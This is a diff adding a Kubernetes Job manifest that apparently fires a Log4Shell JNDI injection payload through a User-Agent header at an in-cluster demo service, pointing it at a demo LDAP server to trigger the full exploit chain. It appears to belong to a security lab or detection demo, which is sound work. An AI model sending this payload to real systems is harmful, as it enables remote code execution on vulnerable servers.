@@ -1,0 +1,35 @@
+# One-off Job: send Log4Shell JNDI payload to trigger the full exploit chain.
+# Trigger with: make trigger-attack (from java/log4shell)
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: log4shell-attack
+spec:
+  ttlSecondsAfterFinished: 600
+  backoffLimit: 2
+  template:
+    metadata:
+      labels:
+        app: log4shell-attack
+    spec:
+      restartPolicy: Never
+      containers:
+        - name: curl
+          image: curlimages/curl:8.4.0
+          imagePullPolicy: IfNotPresent
+          command: ["sh", "-c"]
+          args:
+            - |
+              set -eu
+              BASE="http://log4shell:8080"
+              LDAP_HOST="log4shell-ldap:1389"
+
+              # Single-quote parts so the shell does not expand ${jndi:...} as a variable.
+              UA_PAYLOAD='$${jndi:ldap://'"$${LDAP_HOST}"'/DemoExploit}'
+
+              echo "GET $${BASE}/api/search (User-Agent JNDI payload)"
+              curl -sS -o /dev/null -w "HTTP %{http_code}\n" \
+                -H "User-Agent: $${UA_PAYLOAD}" \
+                "$${BASE}/api/search?q=books"
+
+              echo "attack trigger succeeded"
